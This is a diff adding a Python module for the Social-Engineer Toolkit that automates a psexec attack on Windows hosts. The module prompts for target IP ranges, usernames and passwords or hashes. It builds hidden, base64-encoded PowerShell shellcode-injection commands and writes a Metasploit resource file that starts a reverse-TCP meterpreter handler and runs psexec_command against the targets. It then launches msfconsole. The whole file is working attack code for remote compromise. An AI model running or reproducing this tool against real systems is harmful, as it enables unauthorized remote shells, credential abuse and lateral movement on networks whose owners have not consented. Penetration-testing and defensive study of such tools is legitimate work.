@@ -1,0 +1,86 @@
+#############################################
+#
+# Main SET module for psexec 
+#
+#############################################
+from src.core.setcore import *
+
+# Module options (auxiliary/admin/smb/psexec_command):
+
+#   Name       Current Setting                    Required  Description
+#   ----       ---------------                    --------  -----------
+#   COMMAND    net group "Domain Admins" /domain  yes       The command you want to execute on the remote host
+#   RHOSTS                                        yes       The target address range or CIDR identifier
+#   RPORT      445                                yes       The Target port
+#   SMBDomain  WORKGROUP                          no        The Windows domain to use for authentication
+#   SMBPass                                       no        The password for the specified username
+#   SMBSHARE   C$                                 yes       The name of a writeable share on the server
+#   SMBUser                                       no        The username to authenticate as
+#   THREADS    1                                  yes       The number of concurrent threads
+#   WINPATH    WINDOWS                            yes       The name of the remote Windows directory
+
+# msf auxiliary(psexec_command) >
+
+rhosts=raw_input(setprompt(["32"], "Enter the IP Address or range (RHOSTS) to connect to")) # rhosts
+username=raw_input(setprompt(["32"], "Enter the username")) # username for domain/workgroup
+password=raw_input(setprompt(["32"], "Enter the password or the hash")) # password for domain/workgroup
+domain=raw_input(setprompt(["32"], "Enter the domain name (hit enter for logon locally)")) # domain name
+threads=raw_input(setprompt(["32"], "How many threads do you want [enter for default]"))
+# if blank specify workgroup which is the default
+if domain == "": domain = "WORKGROUP"
+# set the threads
+if threads == "": threads = "15"
+
+#
+# payload generation for powershell injection
+#
+
+try:
+
+   # specify ipaddress of reverse listener
+    ipaddr = grab_ipaddress()
+    update_options("IPADDR=" + ipaddr)
+    port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
+    if port == "": port = "443"
+    update_options("PORT=" + port)
+    update_options("POWERSHELL_SOLO=ON")
+    print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
+    try: reload(src.payloads.powershell.prep)
+    except: import src.payloads.powershell.prep
+    # create the directory if it does not exist
+    if not os.path.isdir(setdir + "/reports/powershell"):
+       os.makedirs(setdir + "/reports/powershell")
+
+    # here we format everything for us
+    x64 = file(setdir + "/x64.powershell", "r")
+    x64 = x64.read()
+    x64 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x64
+    x86 = file(setdir + "/x86.powershell", "r")
+    x86 = x86.read()
+    x86 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x86
+    print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
+    filewrite = file(setdir + "/reports/powershell/x64_powershell_injection.txt", "w")
+    filewrite.write(x64)
+    filewrite.close()
+    filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
+    filewrite.write(x86)
+    victim=raw_input(setprompt(["32"], "What operating system do you want to target x86 or x64 [x64]"))
+    if victim == "x86":
+        payload = "windows/meterpreter/reverse_tcp\n" # if we are using x86
+        command = x86 # assign powershell to command
+    else:
+        payload = "windows/x64/meterpreter/reverse_tcp" # if we are using x64
+        command = x64 # assign powershell to command
+
+    # write out our answer file for the powershell injection attack
+    filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
+    filewrite.write("use multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nexploit\n" % (port,rhosts,username,password,domain,threads,command))
+    filewrite.close()
+    msf_path = meta_path()
+    # launch metasploit below
+    print_status("Launching Metasploit.. This may take a few seconds.")
+    subprocess.Popen("ruby %s/msfconsole -L -n -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()
+
+# handle exceptions
+except Exception, e:
+    print_error("Something went wrong printing error: " + str(e))
